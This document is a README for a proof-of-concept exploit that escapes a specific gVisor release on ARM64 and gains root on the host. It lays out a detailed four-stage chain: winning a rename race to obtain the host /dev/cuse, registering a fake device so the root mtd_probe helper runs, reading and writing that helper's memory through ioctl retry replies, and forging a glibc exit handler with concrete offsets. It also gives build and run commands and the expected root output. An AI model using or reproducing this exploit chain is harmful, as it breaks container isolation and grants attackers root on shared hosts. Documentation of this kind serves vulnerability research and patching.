# gVisor release-20260928.0 — Guest-to-Host Sandbox Escape (PoC)

Reproduction of a guest-to-host escape against gVisor `release-20260928.0` (ARM64). Verified twice end-to-end: a single `docker run` executes a command as **root on the host`.

> ⚠️ Authorized testing only — run against systems you own. The exploit roots the machine hosting the sentry.

## Vulnerability

**Directfs `openHandle` type confusion** in `pkg/sentry/fsimpl/gofer/directfs_inode.go`. Fixed by upstream commit `cd968a36e5557215b5dcb8989011ce0e558b5dd0` ("directfs: Validate host file descriptor identity in openHandle", 2026-09-30 — after this release was cut):

```go
openFD, err := unix.Openat(parent.controlFD, d.name, int(flags), 0)
if err != nil { ... }
return handle{fd: int32(openFD)}, nil   // ← no fstat / type validation
```

The release version never checks that the fd it just opened matches the dentry's cached file type. gVisor's `OpenAt` **releases `fs.renameMu` after revalidating a path component and before `dentry.open()` re-acquires it**, so a rename landing in that gap swaps the file the name points to *after* the sentry has validated it. Result: the sentry opens a host **character device** while believing it opened a regular file, and caches the fd as the REG dentry's shared read handle — the application then reads/writes the host device directly.

## Exploit chain

1. **Race (stage 1)** — image declares `VOLUME /vol` (anonymous volume → mounted `directfs,cache=remote_revalating`), containing `/vol/A` (REG) and `/vol/B` (char 10:203 = host `/dev/cuse`). The racer churns `A` between a cuse hardlink and a **fresh `mknod`'d REG** (fresh inode ⇒ no cached handles ⇒ the won fd gets *stored* as `readFD` instead of discarded by `updateHandles`). Openers hammer `open("/vol/A", O_RDWR|O_TRUNC)`. Typical win: 15–2750 opens.
2. **CUSE registration (stage 2)** — the raced fd is a host `/dev/cuse` channel. Reply to `CUSE_INIT` with `DEVNAME=mtdNNNro` + `CUSE_UNRESTRICTED_IOCTL` → kernel creates the device → host udev rule `75-probe_mtd.rules` (`KERNEL=="mtd*ro"`) runs `/usr/lib/udev/mtd_probe` **as root**.
3. **Arbitrary R/W (stage 3)** — `mtd_probe` issues `ioctl(MEMGETINFO)` (`0x80204d01`). With unrestricted ioctls, replying `FUSE_IOCTL_RETRY` with attacker-chosen in/out iovecs reads/writes the *victim's* address space. Leak stack → libc base (deterministic anchor: `qword[arg+0x178] = libc+0x28598`) → GOT slot `libc+0x1afe48` → `__pointer_chk_guard`.
4. **Exit-handler forge (stage 4)** — write an `ef_cxa` entry into `__exit_funcs` (`fn = system ^ guard`; aarch64 glibc mangles pointers by plain XOR) with the command string parked in the list's unused tail. `mtd_probe` exits → `system("id > /tmp/gvisor-esc-pwned ...")` as root.

## Usage (target: Ubuntu 24.04 arm64 host with Docker + runsc 20260928.0)

```bash
# runtime: runsc release-20260928.0 registered with your container runtime
# host prereqs: /dev/cuse (10:203), /usr/lib/udev/mtd_probe,
#               /usr/lib/udev/rules.d/75-probe_mtd.rules

gcc -static -O2 -Wall -Wextra -Werror -o payload payload.c -lpthread
sudo bash build.sh gvisor-esc          # image: VOLUME /vol + A + B + payload

sudo rm -f /tmp/gvisor-esc-pwned
docker run --rm --runtime=runsc gvisor-esc /payload mtd424242ro
# [+] HOST_CUSE_FD n=4 (race won); renamer stopped
# [+] libc base ... __pointer_chk_guard ... [+] FORGED ...

cat /tmp/gvisor-esc-pwned
# uid=0(root) gid=0(root) groups=0(root)
```

Notes:
- Each run needs a **fresh `mtdNNNro` device name** (udev won't re-trigger `mtd_probe` for a name it already processed).
- `RACE_DEBUG=1` env prints per-thread race stats.
- The payload's own `--dev /dev/cuse <name>` mode runs stages 2–4 directly on the host (no gVisor) — useful for testing the CUSE/R/W/forge chain in isolation.

## Layout

- `payload.c` — the complete exploit (race + CUSE daemon + forge)
- `build.sh` — escape image builder
- `analyze_race.py`, `analyze_race2.py`, `analyze_race3.py` — strace analyzers: measure reval→open windows vs. renames to verify the race is being attempted/won (arch-independent; reuse when recalibrating)
- `run3.sh` — 3× uninstrumented host-mode reliability test (stages 2–4 only)

## Portability caveats

Baked offsets target **aarch64 / glibc 2.39 (Ubuntu 24.04)**: stack anchor, `system`/guard-GOT/`__exit_funcs` libc offsets, and the XOR-only `PTR_MANGLE` (x86_64 glibc uses XOR + `rol 0x11` — must be recalibrated per target). The race itself (stage 1) and the CUSE/RETRY primitives are arch-independent.
